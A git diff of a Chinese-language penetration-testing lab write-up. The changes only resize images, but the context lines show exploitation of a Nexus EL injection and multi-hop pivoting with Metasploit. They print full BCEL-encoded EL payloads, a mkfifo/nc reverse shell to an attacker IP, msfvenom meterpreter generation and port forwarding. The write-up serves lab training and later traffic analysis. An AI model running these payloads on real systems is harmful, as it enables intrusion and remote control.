@@ -19,7 +19,7 @@
 
 在此基础上选取镜像搭建如下结构的网络：
 
-<img src="picture/网络拓扑.png" alt="网络拓扑" style="zoom:33%;" />
+<img src="picture/网络拓扑.png" alt="网络拓扑" style="zoom:20%;" />
 
 其中所用网卡信息如下：
 
@@ -49,17 +49,19 @@
 
 1.浏览器访问靶场环境：
 
-<img src="picture/nexus浏览器访问.png" alt="nexus浏览器访问" style="zoom: 25%;" />
+<img src="picture/nexus浏览器访问.png" alt="nexus浏览器访问" style="zoom: 20%;" />
 
-2.该漏洞需要访问更新角色或创建角色接口，在修改用户角色参数roles中进行EL注入或者也可通过创建角色的roles 和 privileges参数进行EL注入，所以我们需要使用默认账号密码admin/admin123登录后台。<img src="picture/nexus登录.png" alt="nexus登录" style="zoom:33%;" />
+2.该漏洞需要访问更新角色或创建角色接口，在修改用户角色参数roles中进行EL注入或者也可通过创建角色的roles 和 privileges参数进行EL注入，所以我们需要使用默认账号密码admin/admin123登录后台。
+
+<img src="picture/nexus登录.png" alt="nexus登录" style="zoom:20%;" />
 
 3.在此选择对修改用户角色参数roles中进行EL注入，我们选择找到设置中的User处：
 
-<img src="picture/nexus更改Lastname.png" alt="nexus更改Lastname" style="zoom: 25%;" />
+<img src="picture/nexus更改Lastname.png" alt="nexus更改Lastname" style="zoom: 20%;" />
 
 随便改改LastName，这里从User改为了User1，然后抓包如下，发现注入点：
 
-<img src="picture/nexus抓包.png" alt="nexus抓包" style="zoom:33%;" />
+<img src="picture/nexus抓包.png" alt="nexus抓包" style="zoom:20%;" />
 
 4.然后把自己的Cookie、HOST、Referer、Origin都替换到下面POC中：
 
@@ -109,7 +111,7 @@ Content-Length: 308
 
 5.发送POST请求之后，在返回的响应包中可以发现{ "roles": "Missing roles: [36]" }，其中返回的`[36]`，就说明表达式已经被执行了：
 
-<img src="picture/nexus把roles的内容改为EL表达式.png" alt="nexus把roles的内容改为EL表达式" style="zoom:33%;" />
+<img src="picture/nexus把roles的内容改为EL表达式.png" alt="nexus把roles的内容改为EL表达式" style="zoom:20%;" />
 
 6.这说明EL注入漏洞确实存在并且可以利用，尝试通用payload：
 
@@ -192,7 +194,7 @@ ${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInsta
   java --add-exports java.xml/com.sun.org.apache.bcel.internal.classfile=ALL-UNNAMED -jar BCELCodeman.jar e .\eval2.class
   ```
 
-  <img src="picture/nexusBCEL编码.png" alt="nexusBCEL编码" style="zoom: 33%;" />
+  <img src="picture/nexusBCEL编码.png" alt="nexusBCEL编码" style="zoom:20%;" />
 
 - 加载编码后的恶意class，调用exec方法执行 `ls /tmp` 命令获取flag：
 
@@ -200,7 +202,7 @@ ${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInsta
   "roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('ls /tmp')}"]}]
   ```
 
-  <img src="picture/nexus漏洞利用成功.png" alt="nexus漏洞利用成功" style="zoom:33%;" />
+  <img src="picture/nexus漏洞利用成功.png" alt="nexus漏洞利用成功" style="zoom:20%;" />
 
   得到flag：`flag-{bmh2640652e-062c-4c7b-919b-0f57edb8ae99}`
 
@@ -210,7 +212,7 @@ ${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInsta
 rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 4444 > /tmp/f
 ```
 
-<img src="picture/nexus反弹shell成功_getflag.png" alt="nexus反弹shell成功_getflag" style="zoom:33%;" />
+<img src="picture/nexus反弹shell成功_getflag.png" alt="nexus反弹shell成功_getflag" style="zoom:20%;" />
 
 完整POC：
 
@@ -236,7 +238,7 @@ Content-Length: 221
 
 9.发送POST请求，成功get shell：
 
-<img src="picture/nexus反弹shell成功_getflag.png" alt="nexus反弹shell成功_getflag" style="zoom:33%;" />
+<img src="picture/nexus反弹shell成功_getflag.png" alt="nexus反弹shell成功_getflag" style="zoom:20%;" />
 
 ---
 
@@ -248,29 +250,29 @@ Content-Length: 221
 
 0.Wordpress靶场漏洞利用成功之后，获得反弹shell，查看对应ip为`192.170.84.5`：
 
-<img src="picture/wordpress的ip.png" alt="wordpress的ip" style="zoom:33%;" />
+<img src="picture/wordpress的ip.png" alt="wordpress的ip" style="zoom:20%;" />
 
 1.`kali-attacker`命令行执行`msfconsole`启动msf。
 
 2.搜索`liferay`漏洞利用模块并使用：
 
-<img src="picture/搜索liferay模块并使用.png" alt="搜索liferay模块并使用" style="zoom: 33%;" />
+<img src="picture/搜索liferay模块并使用.png" alt="搜索liferay模块并使用" style="zoom:20%;" />
 
 3.查看模块利用所需参数：
 
-<img src="picture/liferay查看参数.png" alt="liferay查看参数" style="zoom: 33%;" />
+<img src="picture/liferay查看参数.png" alt="liferay查看参数" style="zoom:20%;" />
 
 4.模块设置参数并运行：
 
-<img src="picture/liferay设置参数并运行.png" alt="liferay设置参数并运行" style="zoom: 33%;" />
+<img src="picture/liferay设置参数并运行.png" alt="liferay设置参数并运行" style="zoom:20%;" />
 
 5.进入到靶场shell之后查看网络情况，发现其为双网卡，其在`192.170.84.0/24`网段下的ip为`192.170.84.6`：
 
-<img src="picture/liferay查看网络情况.png" alt="liferay查看网络情况" style="zoom:33%;" />
+<img src="picture/liferay查看网络情况.png" alt="liferay查看网络情况" style="zoom:20%;" />
 
 由此可以完善我们的第一层网络拓扑：
 
-<img src="picture/第一层网络拓扑图.png" alt="第一层网络拓扑图" style="zoom:33%;" />
+<img src="picture/第一层网络拓扑图.png" alt="第一层网络拓扑图" style="zoom:20%;" />
 
 6.在`meterpreter`中添加自动路由并查看：
 
@@ -281,35 +283,35 @@ run post/multi/manage/autoroute
 run autoroute -p
 ```
 
-<img src="picture/liferay添加自动路由并查看路由表.png" alt="liferay添加自动路由并查看路由表" style="zoom: 33%;" />
+<img src="picture/liferay添加自动路由并查看路由表.png" alt="liferay添加自动路由并查看路由表" style="zoom:20%;" />
 
 7.执行`bg`将session放于后台，之后搜索`portscan`扫描模块并使用`auxiliary/scanner/portscan/tcp`：
 
-<img src="picture/liferay搜索扫描模块并使用.png" alt="liferay搜索扫描模块并使用" style="zoom: 33%;" />
+<img src="picture/liferay搜索扫描模块并使用.png" alt="liferay搜索扫描模块并使用" style="zoom:20%;" />
 
 8.设置扫描模块参数并运行：
 
-<img src="picture/liferay设置扫描参数运行.png" alt="liferay扫描设置参数、运行" style="zoom: 33%;" />
+<img src="picture/liferay设置扫描参数运行.png" alt="liferay扫描设置参数、运行" style="zoom:20%;" />
 
 9.进入已经获得的liferay终端中使用curl进行进一步的网页信息获取：
 
 发现webmin靶场url为`192.170.84.4:10000`：
 
-<img src="picture/发现webmin.png" alt="发现webmin" style="zoom:25%;" />
+<img src="picture/发现webmin.png" alt="发现webmin" style="zoom:20%;" />
 
 发现phpimap靶场url为`192.170.84.2:80`，其中网页内容为经典的phpimap漏洞靶场演示页：
 
-<img src="picture/发现phpimap.png" alt="发现phpimap" style="zoom:33%;" />
+<img src="picture/发现phpimap.png" alt="发现phpimap" style="zoom:20%;" />
 
 下载并查看网页html内容，发现druid靶场url为`192:170.84.3:8888`：
 
-<img src="picture/下载druid网页内容.png" alt="下载druid网页内容" style="zoom:33%;" />
+<img src="picture/下载druid网页内容.png" alt="下载druid网页内容" style="zoom:20%;" />
 
-<img src="picture/发现druid.png" alt="发现druid" style="zoom:33%;" />
+<img src="picture/发现druid.png" alt="发现druid" style="zoom:20%;" />
 
 10.由此可得前两层网络拓扑：
 
-<img src="picture/前两层网络拓扑图.png" alt="前两层网络拓扑图" style="zoom:33%;" />
+<img src="picture/前两层网络拓扑图.png" alt="前两层网络拓扑图" style="zoom:20%;" />
 
 ##### 第二层
 
@@ -317,43 +319,43 @@ run autoroute -p
 
 1.搜索webmin对应漏洞利用模块并使用：
 
-<img src="picture/webmin搜索名称模块并使用.png" alt="webmin搜索模块并使用" style="zoom: 33%;" />
+<img src="picture/webmin搜索名称模块并使用.png" alt="webmin搜索模块并使用" style="zoom:20%;" />
 
 2.设置模块所需参数并运行模块：
 
-<img src="picture/webmin设置模块参数并运行.png" alt="webmin设置模块参数并运行" style="zoom: 33%;" />
+<img src="picture/webmin设置模块参数并运行.png" alt="webmin设置模块参数并运行" style="zoom:20%;" />
 
 3.得到Command shell之后执行`session -u 2`升级shell。
 
-<img src="picture/webmin升级shell.png" alt="webmin升级shell" style="zoom: 33%;" />
+<img src="picture/webmin升级shell.png" alt="webmin升级shell" style="zoom:20%;" />
 
 4.进入升级后的shell并查看当前靶机网络情况：
 
-<img src="picture/webmin进入sesion查看网络情况.png" alt="webmin进入sesion查看网络情况" style="zoom:33%;" />
+<img src="picture/webmin进入sesion查看网络情况.png" alt="webmin进入sesion查看网络情况" style="zoom:20%;" />
 
 发现其为双网卡靶机。
 
 5.添加自动路由并查看路由表：
 
-<img src="picture/webmin添加自动路由并查看路由表.png" alt="webmin添加自动路由并查看路由表" style="zoom: 33%;" />
+<img src="picture/webmin添加自动路由并查看路由表.png" alt="webmin添加自动路由并查看路由表" style="zoom:20%;" />
 
 6.搜索端口扫描模块并使用，之后设置参数运行：
 
-<img src="picture/webmin搜索端口扫描模块并使用.png" alt="webmin搜索端口扫描模块并使用" style="zoom: 33%;" />
+<img src="picture/webmin搜索端口扫描模块并使用.png" alt="webmin搜索端口扫描模块并使用" style="zoom:20%;" />
 
-<img src="picture/webmin扫描 设置参数并运行.png" alt="webmin扫描 设置参数并运行" style="zoom: 33%;" />
+<img src="picture/webmin扫描 设置参数并运行.png" alt="webmin扫描 设置参数并运行" style="zoom:20%;" />
 
 扫描结果得到两个可访问ip：`10.10.10.3` 和 `10.10.10.5` 。
 
 7.进入Webmin靶场shell升级后的session会话，恢复到shell终端后curl访问两个候选靶场地址：
 
-<img src="picture/webmin进入升级后终端，curl访问网页.png" alt="webmin进入升级后终端，curl访问网页" style="zoom: 25%;" />
+<img src="picture/webmin进入升级后终端，curl访问网页.png" alt="webmin进入升级后终端，curl访问网页" style="zoom: 20%;" />
 
 发现`10.10.10.5:8081` 网页符合Nexus目标靶场的特征。
 
 完善已知网络拓扑图：
 
-<img src="picture/前三层拓扑.png" alt="前三层拓扑" style="zoom:33%;" />
+<img src="picture/前三层拓扑.png" alt="前三层拓扑" style="zoom:20%;" />
 
 8.之后再次进入升级后的Webmin靶场shell，使用`portfwd`映射Nexus靶场8081端口到本地9001端口：
 
@@ -361,13 +363,13 @@ run autoroute -p
 portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
 ```
 
-<img src="picture/进入升级后的webmin，映射nexus端口8081到本地端口9001.png" alt="进入升级后的webmin，映射nexus端口8081到本地端口9001" style="zoom: 33%;" />
+<img src="picture/进入升级后的webmin，映射nexus端口8081到本地端口9001.png" alt="进入升级后的webmin，映射nexus端口8081到本地端口9001" style="zoom:20%;" />
 
 9.之后本地宿主机就可以通过访问{攻击机ip}:{映射端口}，即`192.168.109.10:9001`访问Nexus靶场。
 
 10.与之前的靶场裸漏攻击步骤相同，登陆进入靶场之后，更改User的Lastname并抓包：
 
-<img src="picture/nexus_映射_更改Lastname.png" alt="nexus_映射_更改Lastname" style="zoom:33%;" />
+<img src="picture/nexus_映射_更改Lastname.png" alt="nexus_映射_更改Lastname" style="zoom:20%;" />
 
 11.为了拿到稳定的 Meterpreter 会话，进行进一步的扩展内网渗透、提权、持久化，反弹一个更强的 shell：**`Meterpreter`**
 
@@ -377,7 +379,7 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.109.10 LPORT=5555 -f elf -o meter.elf
   ```
 
-  <img src="picture/nexus_映射_生成meter.elf文件.png" alt="nexus_映射_生成meter.elf文件" style="zoom: 33%;" />
+  <img src="picture/nexus_映射_生成meter.elf文件.png" alt="nexus_映射_生成meter.elf文件" style="zoom:20%;" />
 
   参数说明：
 
@@ -392,7 +394,7 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
   python3 -m http.server 8000
   ```
 
-  <img src="picture/nexus_映射_Kali攻击机开启http服务.png" alt="nexus_映射_Kali攻击机开启http服务" style="zoom: 33%;" />
+  <img src="picture/nexus_映射_Kali攻击机开启http服务.png" alt="nexus_映射_Kali攻击机开启http服务" style="zoom:20%;" />
 
 - kali攻击机在终端开启端口监听：
 
@@ -420,11 +422,11 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
   {"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"20","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 6666 > /tmp/f')} "]}],"type":"rpc","tid":10}
   ```
 
-  <img src="picture/nexus_映射_发送POST请求.png" alt="nexus_映射_发送POST请求" style="zoom:33%;" />
+  <img src="picture/nexus_映射_发送POST请求.png" alt="nexus_映射_发送POST请求" style="zoom:20%;" />
 
 - 在msf中使用监听模块并设置相应的参数运行：
 
-  <img src="picture/nexus_映射_使用监听模块，设置对应payload类型.png" alt="nexus_映射_使用监听模块，设置对应payload类型" style="zoom: 33%;" />
+  <img src="picture/nexus_映射_使用监听模块，设置对应payload类型.png" alt="nexus_映射_使用监听模块，设置对应payload类型" style="zoom:20%;" />
 
 - get反弹shell之后下载payload文件，为其添加可执行权限，之后运行`meter.elf`：
 
@@ -437,19 +439,19 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
   /tmp/meter
   ```
 
-  <img src="picture/nexus_映射_nc监听，下载执行脚本.png" alt="nexus_映射_nc监听，下载执行脚本" style="zoom: 33%;" />
+  <img src="picture/nexus_映射_nc监听，下载执行脚本.png" alt="nexus_映射_nc监听，下载执行脚本" style="zoom:20%;" />
 
 - 在msf中可以看到目标靶场反连成功，开启了相应的session：
 
-  <img src="picture/nexus反连成功，开启session.png" alt="nexus反连成功，开启session" style="zoom: 33%;" />
+  <img src="picture/nexus反连成功，开启session.png" alt="nexus反连成功，开启session" style="zoom:20%;" />
 
 - 查看目前已有的sessions列表：
 
-  <img src="picture/查看session列表.png" alt="查看session列表" style="zoom: 33%;" />
+  <img src="picture/查看session列表.png" alt="查看session列表" style="zoom:20%;" />
 
 - 进入Nexus目标靶场反连过来的meterpreter中，查看网络情况：
 
-  <img src="picture/webmin进入sesion查看网络情况.png" alt="webmin进入sesion查看网络情况" style="zoom:33%;" />
+  <img src="picture/webmin进入sesion查看网络情况.png" alt="webmin进入sesion查看网络情况" style="zoom:20%;" />
 
   发现其为双网卡靶机，之后可进行下一层的内网渗透。
 
@@ -479,19 +481,19 @@ Content-Length: 221
 {"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"10","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 6666 > /tmp/f')} "]}],"type":"rpc","tid":24}
 ```
 
-<img src="picture/nexus漏洞利用流量抓包.png" alt="nexus漏洞利用流量抓包" style="zoom: 25%;" />
+<img src="picture/nexus漏洞利用流量抓包.png" alt="nexus漏洞利用流量抓包" style="zoom: 20%;" />
 
 2.使用wireshark分析流量包，筛选http流量：
 
-<img src="picture/nexus筛选http流，查看可疑数据包.png" alt="nexus筛选http流，查看可疑数据包" style="zoom:33%;" />
+<img src="picture/nexus筛选http流，查看可疑数据包.png" alt="nexus筛选http流，查看可疑数据包" style="zoom:20%;" />
 
 3.按数据包长度排序，发现可疑流量，对其进行http流追踪：
 
-<img src="picture/nexus对可疑流量包进行http追踪流量.png" alt="nexus对可疑流量包进行http追踪流量" style="zoom:25%;" />
+<img src="picture/nexus对可疑流量包进行http追踪流量.png" alt="nexus对可疑流量包进行http追踪流量" style="zoom:20%;" />
 
 4.发现其中包含恶意负载，执行反弹shell命令。
 
-<img src="picture/nexushttp追踪流发现反弹shell的命令执行.png" alt="nexushttp追踪流发现反弹shell的命令执行" style="zoom: 25%;" />
+<img src="picture/nexushttp追踪流发现反弹shell的命令执行.png" alt="nexushttp追踪流发现反弹shell的命令执行" style="zoom: 20%;" />
 
 #### 编写POC脚本，一键执行漏洞利用反弹shell
 
@@ -604,7 +606,7 @@ listener_thread.join()
 
 在`kali-attacker`中运行脚本，输入靶机ip、端口、本机监听ip、端口：
 
-<img src="picture/nexus运行自动化脚本.png" alt="nexus运行自动化脚本" style="zoom:25%;" />
+<img src="picture/nexus运行自动化脚本.png" alt="nexus运行自动化脚本" style="zoom:20%;" />
 
 成功get反弹shell。
 
@@ -694,7 +696,7 @@ public class eval2 {
 
 验证问题解决：
 
-<img src="picture/nexus测试连接符可用.png" alt="nexus测试连接符可用" style="zoom:25%;" />
+<img src="picture/nexus测试连接符可用.png" alt="nexus测试连接符可用" style="zoom:20%;" />
 
 ## 参考资料
 
